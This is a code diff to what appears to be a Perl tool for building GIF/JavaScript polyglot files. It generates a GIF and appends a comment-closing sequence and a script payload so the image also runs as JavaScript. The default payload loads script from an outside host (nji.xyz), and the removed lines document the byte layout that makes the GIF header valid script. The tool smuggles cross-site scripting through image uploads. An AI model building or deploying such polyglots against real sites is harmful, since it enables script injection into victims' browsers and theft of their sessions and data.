@@ -13,6 +13,7 @@ use warnings;
 use feature qw(say);
 
 use Getopt::Long;
+use GD;
 
 sub usage;
 sub create_gif;
@@ -24,7 +25,7 @@ GetOptions(
     'payload=s' =>  \my $payload,
     'output=s'  =>  \my $outfile,
 );
-usage(0) if $help;
+usage(0)     if $help;
 usage(1) unless $outfile;
 
 $payload //= '<script src=//nji.xyz></script>';
@@ -36,7 +37,8 @@ say <<EOF;
 
 EOF
 
-create_gif unless -f $outfile;
+create_gif              unless -f $outfile;
+
 inject_payload;
 
 say `file $outfile`         if -f '/usr/bin/file';
@@ -59,32 +61,19 @@ EOF
 sub create_gif {
     say "[>] Generating output file";
 
-    my $gif_minimal =
-        # Signature + Version GIF89a
-          "\x47\x49\x46\x38\x39\x61"
-        # Encoding /* it's a valid Logical Screen Width
-        . "\x2f\x2a"
-        # GCTF
-        . "\x00"
-        # BackgroundColor
-        . "\xff"
-        # Pixel Ratio
-        . "\x00"
-        # GlobalColorTable + Blocks
-        . "\x2c\x00\x00\x00\x00\x2f\x2a\x0a\x00\x00\x02\x00\x3b"
-        # Commenting out */
-        . "\x2a\x2f"
-        # Enable the script side by introducing =1;
-        . "\x3d\x31\x3b"
+    my $img = GD::Image->new(
+        32,
+        32,
+         1, # Set 1 to TrueColor (24 bits of color data), default is 8-bit palette
+    );
 
-        . $payload
+    my $color = $img->colorAllocate(0, 0, 0);
 
-        # Trailer
-        . "\x3b";
+    $img->setPixel(0, 0, $color);
 
     open my $fh, '>', $outfile or die;
     binmode $fh;
-    print   $fh  $gif_minimal;
+    print   $fh  $img->gif;
     close   $fh;
 
     say "[✔] File saved to: $outfile\n";
@@ -100,9 +89,7 @@ sub inject_payload {
     sysseek    $fh, 0, 2;
 
     syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
-
     syswrite   $fh, $payload;
-
     syswrite   $fh, "\x3b";
 
     close      $fh;
